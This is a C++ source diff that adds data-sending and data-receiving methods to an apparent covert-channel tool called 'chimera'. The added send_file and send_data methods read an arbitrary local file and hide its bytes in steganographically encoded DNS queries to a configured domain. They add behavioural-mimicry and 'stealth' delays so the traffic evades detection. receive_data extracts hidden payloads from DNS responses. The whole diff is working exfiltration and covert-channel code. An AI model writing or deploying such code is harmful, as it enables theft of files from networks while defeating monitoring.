@@ -3,9 +3,11 @@
 #include "chimera/dns_packet.hpp"
 #include "chimera/Transport.hpp"
 #include "chimera/BehavioralMimicry.hpp"
+#include "chimera/steganography.hpp"
 #include <iostream>
 #include <random>
 #include <thread>
+#include <fstream>
 
 namespace chimera {
 
@@ -167,6 +169,163 @@ std::unique_ptr<ITransport> ChimeraClient::create_transport() const {
         default:
             return nullptr;
     }
+}
+
+// Phase 3: Enhanced steganographic sending methods
+tl::expected<SendResult, ChimeraError> ChimeraClient::send_data(const std::vector<uint8_t>& data) const {
+    auto start_time = std::chrono::steady_clock::now();
+
+    // Create steganographic encoder with client configuration
+    EncodingConfig encoding_config;
+    encoding_config.strategy = config_.encoding_strategy;
+    encoding_config.use_compression = config_.use_compression;
+    encoding_config.randomize_order = config_.randomize_fragments;
+    encoding_config.noise_ratio = config_.noise_ratio;
+    encoding_config.max_fragments = config_.max_fragments;
+
+    SteganographicEncoder encoder(encoding_config);
+
+    // Encode the data into fragments
+    auto fragments_result = encoder.encode_payload(data, config_.target_domain);
+    if (!fragments_result) {
+        return tl::unexpected(ChimeraError::EncodingError);
+    }
+
+    auto fragments = fragments_result.value();
+    
+    // Create appropriate transport
+    auto transport = create_transport();
+    if (!transport) {
+        return tl::unexpected(ChimeraError::ConfigError);
+    }
+    
+    transport->set_timeout(config_.timeout);
+
+    // Apply behavioral mimicry if enabled
+    if (config_.adaptive_transport) {
+        BehavioralMimicry mimicry(config_.behavioral_profile);
+        mimicry.apply_behavioral_delay();
+    }
+
+    // Send each fragment
+    size_t total_bytes_sent = 0;
+    std::vector<DnsType> used_record_types;
+    
+    for (const auto& fragment : fragments) {
+        // Create DNS query based on fragment type
+        DnsQuestion question;
+        question.name = fragment.domain;
+        question.type = fragment.record_type;
+        question.cls = DnsClass::IN;
+
+        // Build and send the query
+        auto packet = DnsPacketBuilder::build_query(question);
+        auto send_result = transport->send(packet);
+        
+        if (!send_result) {
+            return tl::unexpected(ChimeraError::NetworkError);
+        }
+
+        total_bytes_sent += fragment.encoded_data.size();
+        used_record_types.push_back(fragment.record_type);
+
+        // Small delay between fragments for stealth
+        std::this_thread::sleep_for(std::chrono::milliseconds(10));
+    }
+
+    auto end_time = std::chrono::steady_clock::now();
+    auto latency = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time);
+
+    SendResult result;
+    result.bytes_sent = total_bytes_sent;
+    result.latency = latency;
+    result.used_domain = config_.target_domain;
+    result.used_record_types = std::move(used_record_types);
+    result.fragments_sent = fragments.size();
+    result.encoding_used = config_.encoding_strategy;
+    result.compression_used = config_.use_compression;
+
+    return result;
+}
+
+tl::expected<SendResult, ChimeraError> ChimeraClient::send_file(const std::string& file_path) const {
+    // Read file into memory
+    std::ifstream file(file_path, std::ios::binary);
+    if (!file) {
+        return tl::unexpected(ChimeraError::ConfigError);
+    }
+
+    // Get file size
+    file.seekg(0, std::ios::end);
+    size_t file_size = file.tellg();
+    file.seekg(0, std::ios::beg);
+
+    // Read file data
+    std::vector<uint8_t> file_data(file_size);
+    file.read(reinterpret_cast<char*>(file_data.data()), file_size);
+    file.close();
+
+    // Send the file data using enhanced steganographic methods
+    return send_data(file_data);
+}
+
+tl::expected<SendResult, ChimeraError> ChimeraClient::send_multi_record(const std::vector<uint8_t>& data) const {
+    // Force multi-record encoding strategy
+    ClientConfig temp_config = config_;
+    temp_config.encoding_strategy = EncodingStrategy::MULTI_RECORD;
+    
+    ChimeraClient temp_client(temp_config);
+    return temp_client.send_data(data);
+}
+
+tl::expected<std::vector<uint8_t>, ChimeraError> ChimeraClient::receive_data(const std::string& query_domain) const {
+    // Create transport
+    auto transport = create_transport();
+    if (!transport) {
+        return tl::unexpected(ChimeraError::ConfigError);
+    }
+    
+    transport->set_timeout(config_.timeout);
+
+    // Query for different record types to extract steganographic data
+    std::vector<DnsResourceRecord> all_records;
+    
+    std::vector<DnsType> query_types = {DnsType::A, DnsType::AAAA, DnsType::TXT};
+    
+    for (auto record_type : query_types) {
+        DnsQuestion question;
+        question.name = query_domain;
+        question.type = record_type;
+        question.cls = DnsClass::IN;
+
+        auto packet = DnsPacketBuilder::build_query(question);
+        auto response = transport->send(packet);
+        
+        if (response) {
+            auto receive_result = transport->receive();
+            if (receive_result) {
+                std::vector<DnsResourceRecord> records;
+                DnsPacketBuilder::parse_response(receive_result.value(), records);
+                all_records.insert(all_records.end(), records.begin(), records.end());
+            }
+        }
+    }
+
+    // Extract steganographic data from responses
+    auto extracted = SteganographicExtractor::extract_from_dns_response(all_records);
+    if (!extracted) {
+        return tl::unexpected(ChimeraError::DecodingError);
+    }
+
+    return extracted.value();
+}
+
+size_t ChimeraClient::estimate_capacity() const {
+    EncodingConfig encoding_config;
+    encoding_config.strategy = config_.encoding_strategy;
+    encoding_config.max_fragments = config_.max_fragments;
+    
+    return SteganographicEncoder::estimate_total_capacity(encoding_config);
 }
 
 } // namespace chimera
